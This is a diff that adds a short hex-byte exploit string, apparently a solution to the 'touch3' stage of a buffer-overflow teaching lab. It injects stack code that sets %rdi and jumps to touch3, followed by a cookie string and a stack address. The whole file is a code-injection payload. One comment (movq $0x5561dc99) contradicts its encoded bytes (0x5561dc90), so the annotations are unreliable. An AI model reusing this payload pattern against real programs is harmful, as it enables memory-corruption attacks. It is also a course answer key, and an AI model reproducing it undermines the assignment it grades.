@@ -1,0 +1,8 @@
+fa 18 40 00 00 00 00 00 /* addr of touch3 */
+48 83 ec 30          	/* subq	$0x30,%rsp */
+48 c7 c7 90 dc 61 55    /* movq	$0x5561dc99,%rdi */
+c3                      /* retq */
+00 00 00 00				/* garbage */
+35 39 62 39 39 37 66 61 /* the string of cookie */
+00 00 00 00 00 00 00 00 /* garbage */
+80 dc 61 55 00 00 00 00 /* addr of stack */
